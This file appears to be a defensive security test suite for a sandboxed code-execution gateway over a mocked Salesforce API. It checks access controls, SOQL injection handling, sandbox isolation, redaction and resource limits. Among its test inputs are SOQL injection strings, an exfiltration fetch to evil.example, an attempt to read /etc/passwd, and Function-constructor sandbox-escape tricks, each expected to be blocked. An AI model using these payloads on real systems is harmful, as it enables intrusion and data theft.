import { describe, expect, it } from "vitest";
import { MockSalesforceClient, MOCK_USERS } from "@sfcm/salesforce-client";
import { makePlatform, principal, run } from "../helpers/harness";

describe("authorization: objects, fields, records", () => {
  it("unauthorized object access: service agent cannot read Quotes (CRUD) via tools or metadata", async () => {
    const p = makePlatform();
    // The CPQ tools need sf.read.cpq, which service_agent lacks => not even bound in the sandbox.
    const viaTool = await run(p, principal("service_agent"), `async () => sf.getQuotes({})`);
    expect(viaTool.ok).toBe(false);
    expect(viaTool.error?.message).toMatch(/not a function/);
    // Even with permission to describe, Salesforce-side CRUD hides the object.
    const viaMeta = await run(p, principal("service_agent"), `async () => sf.describeObject({ objectName: "Quote" })`);
    expect(viaMeta.ok).toBe(false);
    expect(viaMeta.error?.code).toBe("forbidden");
    const objs = await run(p, principal("service_agent"), `async () => (await sf.getAvailableObjects({})).objects.map(o => o.name)`);
    expect(objs.result).not.toContain("Quote");
    expect(objs.result).toContain("Case");
  });

  it("unauthorized field access: FLS-hidden fields are omitted, reported, and cannot be filtered on", async () => {
    const p = makePlatform();
    const out = await run(p, principal("service_agent"), `async () => {
      const opps = await sf.getOpportunities({ limit: 2 });
      const acct = await sf.getAccount({ accountId: "001000000000001AAA", extraFields: ["Past_Due_Amount__c", "Tax_ID__c"] });
      let filtered: string;
      try { await sf.getOpportunities({ minAmount: 1 }); filtered = "leaked" } catch (e) { filtered = (e as Error).message }
      return { oppKeys: Object.keys(opps.records[0]!), omitted: opps.omittedFields, acct: acct.record, acctOmitted: acct.omittedFields, filtered };
    }`);
    const r = out.result as any;
    expect(r.oppKeys).not.toContain("Amount");
    expect(r.omitted).toContain("Amount");
    expect(r.acct.AnnualRevenue).toBeUndefined();
    expect(r.acct.Tax_ID__c).toBeUndefined();
    expect(r.acctOmitted).toEqual(expect.arrayContaining(["AnnualRevenue", "Tax_ID__c", "Past_Due_Amount__c"]));
    expect(r.filtered).toMatch(/^\[forbidden\].*Amount/);
  });

  it("record-level sharing: a private-OWD rep sees only their own records through every tool", async () => {
    const p = makePlatform();
    const rep = principal("sales_rep");
    const out = await run(p, rep, `async () => {
      const a = await sf.searchAccounts({ limit: 100 });
      const direct = await sf.getAccount({ accountId: "001000000000006AAA" }); // Wayne Financial, owned by admin
      return { names: a.records.map(r => r.Name), directOk: true, direct };
    }`);
    expect(out.ok).toBe(false); // direct fetch of an invisible record must fail
    expect(out.error?.message).toMatch(/not found or not visible/);
    const list = await run(p, rep, `async () => (await sf.searchAccounts({ limit: 100 })).records.map(r => r.Name)`);
    expect(list.result).toEqual(["Acme Corporation", "Globex Industries", "Umbrella Health"]);
    // Adapter data (Data Cloud) is filtered by the same Salesforce sharing.
    const analystRep = principal("analyst", { salesforceUserId: "sf_rep_east" });
    const dc = await run(p, analystRep, `async () => (await sf.searchCustomerProfiles({ query: "example", limit: 50 })).profiles.map(x => x.accountId)`);
    const visible = new Set(["001000000000001AAA", "001000000000002AAA", "001000000000004AAA"]);
    expect((dc.result as string[]).length).toBeGreaterThan(0);
    for (const id of dc.result as string[]) expect(visible.has(id)).toBe(true);
  });

  it("CRUD on write: analysts and viewers cannot write; write tools are not bound for them", async () => {
    const p = makePlatform();
    for (const role of ["analyst", "viewer", "sales_rep"] as const) {
      const out = await run(p, principal(role), `async () => sf.createCase({ subject: "hacked" })`);
      expect(out.ok, role).toBe(false);
      expect(p.org.data.Case!.length).toBe(14);
    }
  });

  it("FLS on write: Salesforce-side permission check still applies after approval", async () => {
    const p = makePlatform();
    // service_agent role may write (gateway), but this principal is mapped to a read-only Salesforce profile.
    const agent = principal("service_agent", { userId: "a1", salesforceUserId: "sf_analyst" });
    const first = await run(p, agent, `async () => sf.createCase({ subject: "Should be blocked by Salesforce CRUD" })`);
    await p.governance.approvals.decide(first.error!.approvalId!, "approver", true);
    const second = await run(p, agent, `async () => sf.createCase({ subject: "Should be blocked by Salesforce CRUD" })`);
    expect(second.ok).toBe(false);
    expect(second.error?.code).toBe("forbidden");
    expect(p.org.data.Case!.length).toBe(14);
  });

  it("writes can be disabled globally by policy", async () => {
    const p = makePlatform({ EXECUTION_POLICY_JSON: JSON.stringify({ writesEnabled: false }) });
    const out = await run(p, principal("admin"), `async () => sf.createCase({ subject: "nope nope" })`);
    expect(out.ok).toBe(false);
    expect(out.error?.message).toMatch(/not a function/); // the tool is not even bound
    // Defense in depth: calling the choke point directly is refused too.
    const session = p.newSession(principal("admin"));
    await expect(session.call("createCase", { subject: "nope nope" })).rejects.toThrow(/disabled/);
  });
  it("global tool allowlist narrows what exists in the sandbox", async () => {
    const p = makePlatform({ EXECUTION_POLICY_JSON: JSON.stringify({ toolAllowlist: ["searchAccounts"] }) });
    const ok = await run(p, principal("admin"), `async () => (await sf.searchAccounts({ limit: 1 })).count`);
    expect(ok.result).toBe(1);
    const no = await run(p, principal("admin"), `async () => sf.getOpportunities({})`);
    expect(no.ok).toBe(false);
  });
  it("agent allowlist: unapproved Agentforce agents cannot be invoked", async () => {
    const p = makePlatform();
    const out = await run(p, principal("analyst"), `async () => sf.invokeApprovedAgent({ agentName: "Rogue_Agent", prompt: "hi" })`);
    expect(out.error?.message).toMatch(/not on the approved agent list/);
    const ds = await run(p, principal("analyst"), `async () => sf.queryApprovedDataCloudSources({ source: "SecretPII" })`);
    expect(ds.error?.message).toMatch(/not approved/);
  });
});

describe("SOQL injection", () => {
  it("quote-breaking search text matches literally and never widens the query", async () => {
    const p = makePlatform();
    const all = await run(p, principal("analyst"), `async () => (await sf.searchAccounts({ limit: 100 })).count`);
    for (const payload of ["' OR Name != '", "x') OR (Name != '", "\\' OR 1=1 --", "%", "_", "'; DELETE FROM Account; --"]) {
      const out = await run(p, principal("analyst"), `async () => (await sf.searchAccounts({ query: ${JSON.stringify(payload)} })).count`);
      expect(out.ok, payload).toBe(true);
      expect(out.result, payload).toBe(0);
    }
    expect(all.result).toBe(8);
  });
  it("identifier and id parameters are rejected before reaching Salesforce", async () => {
    const p = makePlatform();
    for (const code of [
      `async () => sf.getAccount({ accountId: "001' OR Id != '" })`,
      `async () => sf.searchAccounts({ extraFields: ["Name FROM User WHERE Id != null--"] })`,
      `async () => sf.searchAccounts({ orderBy: "Name; DELETE" })`,
      `async () => sf.getOpportunities({ accountIds: ["001000000000001AAA' OR '1'='1"] })`,
      `async () => sf.getOpportunities({ closeDateFrom: "2026-01-01' OR Amount > 0" })`,
      `async () => sf.describeObject({ objectName: "Account WHERE 1=1" })`,
      `async () => sf.queryApprovedDataCloudSources({ source: "ChurnScores", filters: { "x OR 1=1": 1 } })`,
    ]) {
      const out = await run(p, principal("admin"), code);
      expect(out.ok, code).toBe(false);
      expect(out.error?.code, code).toBe("invalid_input");
    }
  });
  it("there is no raw-SOQL tool in the registry", () => {
    const p = makePlatform();
    expect(p.registry.list().filter((t) => /soql|query$/i.test(t.name) && t.name !== "queryApprovedDataCloudSources")).toEqual([]);
  });
  it("the mock server rejects stacked or non-SELECT statements even if a bug slipped one through", async () => {
    const c = new MockSalesforceClient((makePlatform()).org, MOCK_USERS.sf_admin!);
    await expect(c.query("SELECT Id FROM Account WHERE Name = 'a' OR Id != '' ; DELETE FROM Account")).rejects.toThrow();
  });
});

describe("sandbox isolation: credentials, network, filesystem, process", () => {
  it("generated code cannot see the host: no process, fetch, require, env, timers, or host bindings", async () => {
    const p = makePlatform({ SF_CLIENT_SECRET: "SUPER-SECRET-VALUE", ANTHROPIC_API_KEY: "sk-ant-SUPER-SECRET" });
    const out = await run(p, principal("admin"), `async () => {
      const g = (function () { return this })();
      const names = Object.getOwnPropertyNames(g);
      return { names, types: [typeof g.process, typeof g.fetch, typeof g.require, typeof g.XMLHttpRequest, typeof g.WebSocket, typeof g.setTimeout, typeof g.Buffer, typeof g.__hostCall, typeof g.__hostLog, typeof g.env] };
    }`);
    expect(out.ok).toBe(true);
    const r = out.result as { names: string[]; types: string[] };
    expect(r.types.every((t) => t === "undefined")).toBe(true);
    expect(JSON.stringify(r.names)).not.toMatch(/SECRET|token|credential/i);
  });
  it("secrets never appear in any result, log, trace or audit record", async () => {
    const p = makePlatform({ SF_CLIENT_SECRET: "SUPER-SECRET-VALUE", TOKEN_ENCRYPTION_KEY: "SUPER-KEY", ANTHROPIC_API_KEY: "sk-ant-SUPER" });
    const out = await run(p, principal("admin"), `async () => { console.log("x"); return await sf.searchAccounts({ limit: 5 }); }`);
    const everything = JSON.stringify([out, await p.governance.audit.list(100)]);
    expect(everything).not.toMatch(/SUPER-SECRET|SUPER-KEY|sk-ant|tok_|Bearer /);
    expect(JSON.stringify(p.registry.list().map((t) => t.description))).not.toContain("SUPER");
  });
  it("arbitrary network access is impossible (blocked statically and absent at runtime)", async () => {
    const p = makePlatform();
    const direct = await run(p, principal("admin"), `async () => { const r = await fetch("https://evil.example/exfil"); return r.status }`);
    expect(direct.error?.code).toBe("code_rejected");
    const sneaky = await run(p, principal("admin"), `async () => { const g = (function(){ return this })(); return await g.fetch("https://evil.example") }`);
    expect(sneaky.ok).toBe(false);
    expect(sneaky.error?.message).toMatch(/not a function|undefined|cannot read/i);
    const proto = await run(p, principal("admin"), `async () => { const f = (async () => {}).constructor; return f("return 1")() }`);
    expect(proto.error?.code).toBe("code_rejected");
  });
  it("filesystem and process access are impossible", async () => {
    const p = makePlatform();
    for (const code of [`async () => require("fs").readFileSync("/etc/passwd")`, `async () => process.env`, `async () => { const fs = await import("node:fs"); return fs }`]) {
      const out = await run(p, principal("admin"), code);
      expect(out.ok, code).toBe(false);
      expect(out.error?.code).toBe("code_rejected");
    }
  });
  it("tool bindings are frozen and cannot be redefined to intercept calls", async () => {
    const p = makePlatform();
    const out = await run(p, principal("admin"), `async () => {
      try { (sf as any).searchAccounts = async () => ({ records: [{ Name: "forged" }] }); } catch {}
      const r = await sf.searchAccounts({ limit: 1 });
      return r.records[0]!.Name;
    }`);
    expect(out.result).toBe("Acme Corporation");
  });
  it("host call arguments are re-validated on the host (sandbox cannot bypass Zod)", async () => {
    const p = makePlatform();
    const out = await run(p, principal("admin"), `async () => sf.searchAccounts({ limit: 1000000, query: 12345 as any })`);
    expect(out.error?.code).toBe("invalid_input");
  });
  it("sensitive data in records is redacted before reaching the program", async () => {
    const p = makePlatform();
    const out = await run(p, principal("admin"), `async () => {
      const c = await sf.getCaseDetails({ caseId: "500000000000001AAA" });
      const a = await sf.getAccount({ accountId: "001000000000001AAA", extraFields: ["Tax_ID__c"] });
      const ct = await sf.searchContacts({ accountId: "001000000000001AAA", extraFields: ["National_ID__c"] });
      return { description: c.record.Description, tax: a.record.Tax_ID__c, nid: ct.records[0]!.National_ID__c };
    }`);
    const r = out.result as any;
    expect(r.description).not.toMatch(/4111|12-3456789/);
    expect(r.description).toContain("[REDACTED]");
    expect(JSON.stringify(r)).not.toMatch(/12-3456789/);
    expect(out.metadata.redactions).toBeGreaterThan(0);
  });
  it("redaction also applies to values the program assembles itself", async () => {
    const p = makePlatform();
    const out = await run(p, principal("admin"), `async () => ({ note: "customer ssn is 123-45-6789", token: "abc" })`);
    expect(JSON.stringify(out.result)).not.toContain("123-45-6789");
    expect((out.result as any).token).toBe("[REDACTED]");
  });
});

describe("resource limits", () => {
  it("infinite synchronous loops are interrupted at the timeout", async () => {
    const p = makePlatform({}, { timeoutMs: 400 });
    const t0 = Date.now();
    const out = await run(p, principal("admin"), `async () => { let go = 1; while (go) {} }`);
    expect(out.ok).toBe(false);
    expect(out.error?.code).toBe("timeout");
    expect(Date.now() - t0).toBeLessThan(5000);
    // The gateway keeps working afterwards.
    expect((await run(p, principal("admin"), `async () => 7`)).result).toBe(7);
  });
  it("unresolved promises are cut off by the wall-clock timeout", async () => {
    const p = makePlatform({}, { timeoutMs: 300 });
    const out = await run(p, principal("admin"), `async () => { await new Promise(() => {}); }`);
    expect(out.error?.code).toBe("timeout");
  });
  it("runaway memory allocation is stopped", async () => {
    const p = makePlatform({}, { timeoutMs: 5000 });
    const out = await run(p, principal("admin"), `async () => { const a: number[][] = []; for (let i = 0; i >= 0; i++) a.push(new Array(1_000_000).fill(1)); }`);
    expect(out.ok).toBe(false);
    expect(String(out.error?.message)).toMatch(/memory|timed out|out of/i);
  });
  it("oversized array results are truncated with markers; unrepresentable huge strings are rejected", async () => {
    const p = makePlatform({ EXECUTION_POLICY_JSON: JSON.stringify({ maxResultBytes: 5000 }) });
    const arr = await run(p, principal("admin"), `async () => Array.from({ length: 5000 }, (_, i) => ({ i, pad: "x".repeat(30) }))`);
    expect(arr.ok).toBe(true);
    expect(arr.metadata.truncated).toBe(true);
    expect((arr.result as any).originalCount).toBe(5000);
    expect(arr.metadata.resultBytes).toBeLessThanOrEqual(5000);
    const str = await run(p, principal("admin"), `async () => "y".repeat(500000)`);
    expect(str.ok).toBe(false);
    expect(str.error?.code).toBe("result_too_large");
  });
  it("maximum code size", async () => {
    const p = makePlatform({ EXECUTION_POLICY_JSON: JSON.stringify({ maxCodeBytes: 200 }) });
    const out = await run(p, principal("admin"), `async () => { ${"const x = 1;".repeat(100)} }`);
    expect(out.error?.code).toBe("code_rejected");
  });
  it("max records per call is enforced by policy", async () => {
    const p = makePlatform({ EXECUTION_POLICY_JSON: JSON.stringify({ maxRecordsPerQuery: 3 }) });
    const out = await run(p, principal("admin"), `async () => { const r = await sf.searchAccounts({ limit: 200 }); return { n: r.count, more: r.hasMore } }`);
    expect(out.result).toEqual({ n: 3, more: true });
  });
  it("tool-call and Salesforce API budgets per execution", async () => {
    const p = makePlatform({ EXECUTION_POLICY_JSON: JSON.stringify({ maxToolCallsPerExecution: 3 }) });
    const out = await run(p, principal("admin"), `async () => { for (let i = 0; i < 10; i++) await sf.searchAccounts({ limit: 1 }); return 1 }`);
    expect(out.ok).toBe(false);
    expect(out.error?.message).toMatch(/Maximum tool calls/);
    expect(out.metadata.toolCalls).toBe(4);
    const q = makePlatform({ EXECUTION_POLICY_JSON: JSON.stringify({ maxSalesforceApiCallsPerExecution: 2 }) });
    const o2 = await run(q, principal("admin"), `async () => { for (let i = 0; i < 6; i++) await sf.searchCases({ limit: 1 }); return 1 }`);
    expect(o2.error?.message).toMatch(/API call budget/);
  });
  it("rate limits executions per user", async () => {
    const p = makePlatform({ EXECUTION_POLICY_JSON: JSON.stringify({ executionsPerMinute: 3 }) });
    for (let i = 0; i < 3; i++) expect((await run(p, principal("admin"), `async () => 1`)).ok).toBe(true);
    const out = await run(p, principal("admin"), `async () => 1`);
    expect(out.error?.code).toBe("rate_limited");
    expect((await run(p, principal("analyst"), `async () => 1`)).ok).toBe(true); // other users unaffected
    expect((await p.governance.audit.list(10)).length).toBeGreaterThan(0);
  });
});

describe("defense in depth: static checks are not the boundary", () => {
  it("rejects blatant unbounded loops early", async () => {
    const p = makePlatform();
    for (const code of ["async () => { while (true) {} }", "async () => { for (;;) {} }", "async () => { do {} while (1) }"]) {
      const out = await run(p, principal("admin"), code);
      expect(out.error?.code, code).toBe("code_rejected");
    }
  });
  it("lint bypasses (computed property names) still cannot reach the host: the realm itself is empty", async () => {
    const p = makePlatform();
    const out = await run(p, principal("admin"), `async () => {
      const k = "constr" + "uctor";
      const F = ([] as any)[k][k];               // Function constructor, reached without the literal '.constructor'
      const g = F("return this")();               // the sandbox's global object
      return {
        hostGlobals: ["process", "fetch", "require", "XMLHttpRequest", "WebSocket", "setTimeout", "Buffer", "__hostCall", "__hostLog"].map((n) => typeof g[n]),
        names: Object.getOwnPropertyNames(g).filter((n) => /secret|token|key|env/i.test(n)),
      };
    }`);
    expect(out.ok).toBe(true);
    expect((out.result as any).hostGlobals.every((t: string) => t === "undefined")).toBe(true);
    expect((out.result as any).names).toEqual([]);
  });
  it("runtime errors are reported as execution_error, not code_rejected", async () => {
    const p = makePlatform();
    const out = await run(p, principal("admin"), `async () => { const x: any = undefined; return x.boom }`);
    expect(out.error?.code).toBe("execution_error");
  });
});

describe("audit trail", () => {
  it("records discover/execute/tool/denied/approval events and stays verifiable", async () => {
    const p = makePlatform();
    await run(p, principal("analyst"), `async () => sf.searchAccounts({ limit: 1 })`);
    await run(p, principal("analyst"), `async () => sf.createCase({ subject: "denied one" })`);
    await run(p, principal("service_agent"), `async () => sf.createCase({ subject: "needs approval" })`);
    const events = await p.governance.audit.list(100);
    const actions = new Set(events.map((e) => e.action));
    expect([...actions]).toEqual(expect.arrayContaining(["execute", "tool.invoke", "approval.requested"]));
    expect((await p.governance.audit.verify()).valid).toBe(true);
    expect(JSON.stringify(events)).not.toMatch(/needs approval|denied one/); // args are not copied into the audit log
  });
});
